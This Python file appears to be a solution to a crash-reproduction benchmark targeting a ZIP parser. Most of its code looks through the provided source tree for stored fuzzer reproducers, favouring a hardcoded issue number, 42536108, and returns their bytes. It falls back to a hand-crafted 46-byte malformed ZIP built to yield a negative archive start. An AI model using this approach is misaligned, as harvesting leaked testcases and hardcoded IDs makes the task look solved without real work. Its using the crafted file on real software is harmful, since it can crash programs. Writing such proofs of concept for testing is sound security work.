import os
import io
import re
import struct
import tarfile
from typing import List, Tuple, Optional


SOURCE_EXTS = {
    ".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh",
    ".py", ".pyi", ".java", ".js", ".ts", ".go", ".rs", ".swift", ".kt",
    ".m", ".mm", ".cs",
    ".md", ".rst", ".txt", ".html", ".css",
    ".cmake", ".mk", ".make", ".in", ".am", ".ac",
    ".yml", ".yaml", ".json", ".toml", ".xml",
    ".sh", ".bat", ".ps1",
    ".gradle", ".bazel", ".bzl",
    ".gitignore", ".gitattributes",
}

ARCHIVE_EXTS = {
    ".zip", ".jar", ".apk",
    ".7z", ".rar",
    ".tar", ".gz", ".tgz", ".bz2", ".xz", ".lz", ".lz4", ".zst",
    ".cab", ".iso", ".ar", ".cpio",
}


def _score_name(path: str) -> int:
    p = path.replace("\\", "/")
    low = p.lower()
    bn = os.path.basename(low)

    score = 0

    # Strong signals
    if "clusterfuzz-testcase-minimized" in low:
        score += 5000
    if "clusterfuzz" in low:
        score += 1500
    if "testcase" in low and "minimized" in low:
        score += 1200
    if "crash" in bn or "crashes" in low:
        score += 1000
    if "poc" in bn or "/poc/" in low or low.endswith("/poc"):
        score += 900
    if "repro" in bn or "reproducer" in low:
        score += 850
    if "oss-fuzz" in low or "ossfuzz" in low:
        score += 300
    if "regression" in low:
        score += 250
    if "issue" in low:
        score += 150

    # Likely locations
    for token in ("/testcases/", "/testcase/", "/corpus/", "/seed_corpus/", "/seeds/", "/testdata/", "/test_data/", "/data/"):
        if token in low:
            score += 220
            break

    # Extension hints
    ext = os.path.splitext(bn)[1]
    if ext in ARCHIVE_EXTS:
        score += 140
    elif ext and ext not in SOURCE_EXTS:
        score += 60

    # Penalize obvious source code
    if ext in SOURCE_EXTS:
        score -= 200

    # Numeric-looking filename sometimes indicates saved artifact
    if re.search(r"\b(42536108)\b", low):
        score += 1200

    return score


def _safe_read_tar_member(tf: tarfile.TarFile, m: tarfile.TarInfo, limit: int = 2_000_000) -> Optional[bytes]:
    if not m.isfile():
        return None
    if m.size <= 0 or m.size > limit:
        return None
    f = tf.extractfile(m)
    if f is None:
        return None
    data = f.read()
    return data


def _find_best_embedded_input_from_tar(src_path: str) -> Optional[bytes]:
    try:
        with tarfile.open(src_path, mode="r:*") as tf:
            best: Optional[Tuple[int, int, str, tarfile.TarInfo]] = None  # (-score, size, name, member)
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > 1_000_000:
                    continue
                name = m.name
                score = _score_name(name)
                if score <= 0:
                    continue
                key = (-score, m.size, name)
                if best is None or key < (best[0], best[1], best[2]):
                    best = (-score, m.size, name, m)

            if best is not None:
                data = _safe_read_tar_member(tf, best[3])
                if data is not None:
                    return data
    except Exception:
        return None
    return None


def _find_best_embedded_input_from_dir(src_dir: str) -> Optional[bytes]:
    best: Optional[Tuple[int, int, str]] = None  # (-score, size, path)
    for root, _, files in os.walk(src_dir):
        for fn in files:
            full = os.path.join(root, fn)
            try:
                st = os.stat(full)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > 1_000_000:
                continue
            rel = os.path.relpath(full, src_dir).replace("\\", "/")
            score = _score_name(rel)
            if score <= 0:
                continue
            key = (-score, st.st_size, rel)
            if best is None or key < best:
                best = (-score, st.st_size, full)
    if best is None:
        return None
    try:
        with open(best[2], "rb") as f:
            return f.read()
    except Exception:
        return None


def _crafted_zip_negative_archive_start_poc_46() -> bytes:
    # 24 bytes: truncated central directory file header
    #   signature + ver_made + ver_needed + flags + comp + time + date + crc32 + comp_size
    cd = b"PK\x01\x02" + struct.pack(
        "<HHHHHHII",
        20,  # version made by
        20,  # version needed to extract
        0,   # general purpose bit flag
        0,   # compression method
        0,   # last mod file time
        0,   # last mod file date
        0,   # crc-32
        0,   # compressed size
    )
    # EOCD at offset 24; set cd_size=24 and cd_offset=1 => archive_start = 24 - 24 - 1 = -1
    eocd = b"PK\x05\x06" + struct.pack(
        "<HHHHIIH",
        0,    # number of this disk
        0,    # disk where central directory starts
        1,    # number of central directory records on this disk
        1,    # total number of central directory records
        24,   # size of central directory (bytes)
        1,    # offset of start of central directory, relative to start of archive
        0,    # .ZIP file comment length
    )
    poc = cd + eocd
    if len(poc) != 46:
        raise AssertionError("Unexpected PoC size")
    return poc


class Solution:
    def solve(self, src_path: str) -> bytes:
        if os.path.isdir(src_path):
            data = _find_best_embedded_input_from_dir(src_path)
            if data is not None:
                return data
            return _crafted_zip_negative_archive_start_poc_46()

        data = _find_best_embedded_input_from_tar(src_path)
        if data is not None:
            return data

        return _crafted_zip_negative_archive_start_poc_46()